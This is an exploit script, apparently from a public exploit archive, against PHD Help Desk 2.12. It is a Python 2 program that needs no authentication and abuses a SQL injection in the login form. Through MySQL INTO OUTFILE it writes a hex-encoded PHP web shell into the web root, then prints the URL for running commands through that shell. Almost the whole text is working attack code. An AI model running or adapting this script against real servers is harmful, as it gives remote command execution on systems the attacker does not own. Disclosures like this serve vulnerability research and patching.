# Exploit Title: PHD Help Desk 2.12 SQLi
# Date: 05/24/2013
# Exploit Author: drone (@dronesec)
# More information: http://forelsec.blogspot.com/2013/06/phd-help-desk-212-sqli-and-xss.html
# Vendor Homepage: http://www.p-hd.com.ar/
# Software Link: http://downloads.sourceforge.net/project/phd/phd_released/phd%202.12/phd_2_12.zip
# Version: 2.12
# Tested on: Ubuntu 12.04 (apparmor disabled)

""" This app is so full of SQLi & XSS; if you're looking for
    practice with real web apps, this is a good place to go.

    You don't need auth for this.
"""
from argparse import ArgumentParser
import string
import random
import urllib, urllib2
import sys

def run(options):
    print '[!] Dropping web shell on %s...'%(options.ip)

    shell = ''.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))

    # <? php system($_GET["rr"]); ?>
    data = urllib.urlencode({'operador':('\' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e'
                                    ',null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE'
                                        ' \'{0}/{1}.php'.format(options.path,shell)),
                             'contrasenia':'pass',
                             'submit':'Enter',
                             'captcha':''})

    urllib2.urlopen('http://{0}{1}/login.php'.format(options.ip, options.rootp), data)
    print '[!] Shell dropped.  http://%s%s/%s.php?rr=ls'%(options.ip,options.rootp,shell)

def parse():
    parser = ArgumentParser()
    parser.add_argument('-i',help='server address',action='store',dest='ip')
    parser.add_argument('-p',help='path to login.php (/phd_2_12)',action='store',
                default='/phd_2_12', dest='rootp')
    parser.add_argument('-w',help='writable web path (/var/www/phd_2_12) for shell',
                default='/var/www/phd_2_12/', action='store', dest='path')

    options = parser.parse_args()
    if not options.ip:
        parser.print_help()
        sys.exit(1)

    options.path = options.path if options.path[-1] != '/' else options.path[:-1]
    options.rootp = options.rootp if options.path[-1] != '/' else options.path[:-1]
    return options

if __name__=="__main__":
    run(parse())